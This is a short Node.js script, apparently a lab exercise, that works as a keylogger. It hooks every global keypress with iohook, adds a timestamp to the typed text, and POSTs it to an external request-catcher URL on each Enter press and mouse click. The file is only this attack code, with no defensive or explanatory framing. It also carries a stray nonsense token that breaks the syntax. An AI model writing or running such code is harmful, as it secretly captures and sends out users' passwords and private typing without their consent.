const ioHook = require('iohook');
const fetch = require("node-fetch");
let text = "";qwwqwq


ioHook.on("keypress", evnt => {
    var d = new Date(); 
    var n = d.toUTCString(); 
     let sumb = String.fromCharCode(evnt.keychar);
     text += sumb;
     let textWithTime = n + " "+ text;
     if(evnt.keychar == "13"){
        let json = JSON.stringify(textWithTime);
        let response =  fetch('https://laba1.requestcatcher.com/', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json;charset=utf-8',
        },
        body: json
      });
     } 
    console.log('textWithTime: ', textWithTime);
});
ioHook.on("mouseclick", evnt => {
        console.log(text);
        var d = new Date(); 
        var n = d.toUTCString();
        let textWithTime = n + " "+ text;
        let json = JSON.stringify(textWithTime);
        let response =  fetch('https://laba1.requestcatcher.com/', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json;charset=utf-8',
        },
        body: json
      });
        // console.log(evnt);
});

ioHook.start();
